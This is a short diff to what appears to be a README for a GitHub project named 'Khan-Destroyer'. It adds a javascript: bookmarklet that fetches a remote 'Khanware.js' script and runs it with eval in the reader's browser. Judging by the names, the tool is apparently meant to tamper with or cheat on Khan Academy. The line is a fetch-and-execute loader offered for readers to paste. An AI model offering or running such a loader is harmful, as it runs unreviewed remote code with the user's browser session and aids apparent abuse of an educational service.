@@ -38,3 +38,4 @@ Star the repo, or join the discord.
 <br>
 ![image](https://github.com/ilytobias/Khan-Destroyer/assets/165577429/673061fc-c131-423b-a81b-daf862b96493)
 
+javascript:fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(t=>t.text()).then(eval);
